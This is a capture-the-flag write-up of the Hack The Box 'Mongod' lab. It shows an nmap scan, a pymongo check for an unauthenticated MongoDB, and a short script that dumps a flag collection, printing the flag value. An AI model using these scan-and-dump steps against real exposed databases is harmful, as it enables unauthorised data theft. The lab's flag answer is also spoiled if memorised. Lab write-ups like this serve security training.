---
title: "HTB Mongod"
date: 2026-06-23
tags: [htb, very-easy, linux, mongodb]
platform: htb
description: "Unauthenticated MongoDB 27017 exposed to the internet — read the flag collection directly."
outline: [2, 3]
---

# HTB Mongod

Very Easy Starting Point box. Two ports open — `22/ssh` and `27017/mongodb`. The Mongo instance has no authentication and is bound to all interfaces. Connect with `pymongo`, walk the `sensitive_information.flag` collection, read the flag.

## Recon

```bash
nmap -p- --min-rate=1000 -sV 10.129.228.30
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
```

`-p-` scans all 65k ports — this box only exposes 22 and 27017, but starting-point Tier 0 boxes do occasionally hide services on non-standard ports, so the full sweep is cheap insurance.

The interesting finding: **MongoDB 3.6.8 bound to a public interface with no auth**. SSH is a dead end (no creds yet), so all attention goes to 27017.

## Enumeration

Mongo 3.6.x out of the box **does not require authentication** unless `--auth` is enabled in `mongod.conf`. A quick connect test:

```python
from pymongo import MongoClient
client = MongoClient("mongodb://10.129.228.30:27017/", serverSelectionTimeoutMS=5000)
client.admin.command('ping')   # succeeds → no auth in place
```

If the `ping` works, the instance is open. List databases with `client.list_database_names()` — one is named `sensitive_information`, the giveaway.

## Exploitation

### Python script to dump the flag collection

```python
import os
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, OperationFailure

MONGO_IP = "10.129.228.30"
MONGO_PORT = 27017
MONGO_URI = f"mongodb://{MONGO_IP}:{MONGO_PORT}/"

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    print(f"[+] Connected to MongoDB at {MONGO_IP}:{MONGO_PORT}")
except Exception as e:
    print(f"[-] Connection error: {e}")
    exit(1)

# Access the flag collection
db = client["sensitive_information"]
flag_collection = db["flag"]

# Fetch and display the flag
docs = list(flag_collection.find())
if docs:
    print(f"\n[+] Retrieved {len(docs)} document(s):")
    for doc in docs:
        doc.pop('_id', None)   # drop the ObjectId for cleaner output
        print(doc)
else:
    print("[-] No documents found.")

client.close()
```

### Output

```
[+] Connected to MongoDB at 10.129.228.30:27017

[+] Retrieved 1 document(s):
{'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}
```

::: tip Why this works
Older MongoDB defaults (`bindIp: 0.0.0.0` + no `security.authorization: enabled`) left the DB openly enumerable until 3.6 tightened the default bind to `127.0.0.1`. This box kept the legacy config — anyone who can reach port 27017 can read every DB.
:::

## Flag

`1b6e6fb359e7c40241b6d431427ba6ea` — from the `sensitive_information.flag` collection, no authentication required.
